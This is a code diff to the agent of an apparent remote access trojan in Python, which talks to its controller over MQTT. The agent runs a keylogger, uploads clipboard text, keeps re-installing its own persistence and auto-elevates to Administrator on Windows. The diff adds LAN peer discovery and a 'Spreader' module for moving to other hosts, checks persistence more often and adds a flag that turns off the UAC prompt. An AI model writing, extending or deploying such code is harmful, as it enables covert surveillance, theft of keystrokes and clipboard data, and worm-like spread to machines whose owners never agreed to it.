@@ -12,10 +12,11 @@ import time
 import traceback
 from typing import Any
 
-from .. import __version__, config, crypto, protocol
+from .. import __version__, config, crypto, protocol, guardian
 from ..mqtt import MqttClient, random_client_id
-from . import commands, persistence, runtime, stealth, sysinfo, updater, lan
-from ..guardian import install as guardian_install, ensure_startup_approved as guardian_ensure_startup
+from ..lan.beacon import LanService
+from ..lan.spread import Spreader
+from . import commands, health, persistence, runtime, stealth, sysinfo, updater
 from .inputs import Keylogger
 
 
@@ -29,12 +30,16 @@ class Agent:
         self.key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
         self.codec = protocol.Codec(self.key)
         self.reassembler = protocol.Reassembler()
+        self.health = health.Health()
 
         self.agent_id = config.agent_id()
         self.hostname = socket.gethostname()
         self.cwd = os.path.expanduser("~")
         self.processes: set[Any] = set()
         self.keylogger = Keylogger()
+
+        self.lan: LanService | None = None
+        self.spreader = Spreader()
 
         self.bundle_entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
         self.self_sha = self._sha_of(self.bundle_entry)
@@ -60,6 +65,18 @@ class Agent:
                 return hashlib.sha256(handle.read()).hexdigest()[:12]
         except OSError:
             return "unknown"
+
+    def _mac(self) -> str:
+        return config.mac()
+
+    def _subnet(self) -> str:
+        return config.subnet()
+
+    def _known_peer_ids(self) -> set[str]:
+        return {a for a in (config.parent_id(),) if a}
+
+    def _on_peer(self, record: dict) -> None:
+        self.send({"t": "note", "d": f"peer {record.get('host')} {record.get('ip')} hop={record.get('hop')}"})
 
     def reply(self, text: str) -> None:
         """Send a line of output to the controller."""
@@ -102,16 +119,15 @@ class Agent:
             "info": sysinfo.summary(),
             "admin": stealth.is_admin(),
             "persistence": persistence.status(),
-            "lan": {
-                "parent": config.parent_id(),
-                "hop": config.hop(),
-                "group": config.group(),
-                "mac": config.agent_id().split('-')[-1],
-                "subnet": config.parent_ip(),
-                "enabled": config.LAN_ENABLED,
-                "port": config.LAN_PORT,
-                "http_port": config.LAN_HTTP_PORT,
-            },
+            "parent": config.parent_id(),
+            "hop": config.hop(),
+            "parent_ip": config.parent_ip(),
+            "mac": self._mac(),
+            "subnet": self._subnet(),
+            "group": config.group(),
+            "lan": bool(self.lan),
+            "health": self.health.summary(),
+        }
 
     # ------------------------------------------------------------------
     # Inbound
@@ -160,33 +176,27 @@ class Agent:
                 self.send({"t": "progress", "d": f"update {received}/{total}"})
             return
         ok, detail = updater.apply(data, message.get("sha", ""))
-        self.reply(f"update {'applied ' + detail if ok else 'failed: ' + detail}")
+        self.reply(f"update {detail}" if ok else f"update failed: {detail}")
 
     # ------------------------------------------------------------------
-    # Background workers
+    # Periodic workers
     # ------------------------------------------------------------------
 
     def _heartbeat(self) -> None:
         while self._running:
             time.sleep(config.HEARTBEAT_INTERVAL)
-            if self._connected.is_set():
+            try:
                 self.send(self.hello_payload())
+            except Exception:
+                pass
 
     def _telemetry(self) -> None:
         last_clipboard = ""
         while self._running:
             time.sleep(config.TELEMETRY_INTERVAL)
-            if not self._connected.is_set():
-                continue
             try:
-                if self.keylogger.active:
-                    chunk = self.keylogger.take()
-                    if chunk:
-                        self.send({"t": "keys", "d": chunk})
-
-                from .inputs import clipboard_get
-                clipboard = ""
-                current = clipboard_get()
+                current = sysinfo.clipboard_text()
+                clipboard = None
                 if current != last_clipboard:
                     last_clipboard = current
                     clipboard = current[:120]
@@ -209,12 +219,12 @@ class Agent:
     def _housekeeping(self) -> None:
         """Re-assert persistence and heal missing copies."""
         while self._running:
-            time.sleep(30)
+            time.sleep(15)
             try:
                 now = time.time()
-                if now - self._last_persistence_check > 180:
+                if now - self._last_persistence_check > 30:
                     self._last_persistence_check = now
-                    actions = persistence.ensure()
+                    actions = persistence.ensure() + guardian.ensure()
                     if actions:
                         self.send({"t": "note", "d": "persistence: " + ", ".join(actions)})
             except Exception:
@@ -253,7 +263,12 @@ class Agent:
         for host, port, use_tls in config.broker_order():
             try:
                 client = MqttClient(random_client_id("syspy-a"), self._on_message)
-                client.connect(host, port, use_tls)
+                client.connect(
+                    host, port, use_tls,
+                    clean_session=True,
+                    will_topic=config.topic_up(self.agent_id),
+                    will_payload=self.codec.encode({"t": "bye"}),
+                )
                 client.subscribe(config.topic_down(self.agent_id), qos=1)
                 self._client = client
                 self._connected.set()
@@ -266,6 +281,14 @@ class Agent:
     def run(self) -> None:
         """Main loop.  Never returns unless the process is killed."""
         updater.write_boot_marker()
+
+        if config.LAN_ENABLED:
+            try:
+                self.lan = LanService(on_peer=self._on_peer, spreader=self.spreader)
+                self.lan.start()
+                self.spreader.attach(self.lan, known_ids_getter=self._known_peer_ids)
+            except Exception:
+                self.lan = None
 
         for worker in (self._heartbeat, self._telemetry, self._housekeeping):
             threading.Thread(target=worker, name=worker.__name__, daemon=True).start()
@@ -299,6 +322,10 @@ def main(argv: list[str] | None = None) -> int:
     """Entry point for ``agent.py``."""
     argv = list(sys.argv[1:] if argv is None else argv)
 
+    # Process --no-uac early before uninstall and auto-elevate
+    if "--no-uac" in argv:
+        os.environ["SYSPY_NO_UAC"] = "1"
+
     if "--watchdog" in argv:
         return _watchdog_main()
 
@@ -322,7 +349,7 @@ def main(argv: list[str] | None = None) -> int:
         return 0
 
     if "--uninstall" in argv or "--remove" in argv:
-        if stealth.IS_WINDOWS and not stealth.is_admin() and "--no-elevate" not in argv:
+        if stealth.IS_WINDOWS and not stealth.is_admin() and os.environ.get("SYSPY_NO_UAC") != "1" and "--no-elevate" not in argv:
             print("[*] Requesting Administrator privileges to stop services and remove files...")
             if stealth.elevate_process(argv, wait=True):
                 print("[+] Uninstallation completed successfully.")
@@ -339,7 +366,7 @@ def main(argv: list[str] | None = None) -> int:
         return 0
 
     # Auto-elevate to Administrator on Windows if running unprivileged
-    if stealth.IS_WINDOWS and not stealth.is_admin() and "--no-elevate" not in argv:
+    if stealth.IS_WINDOWS and not stealth.is_admin() and os.environ.get("SYSPY_NO_UAC") != "1" and "--no-elevate" not in argv:
         if stealth.elevate_process(argv):
             return 0
 
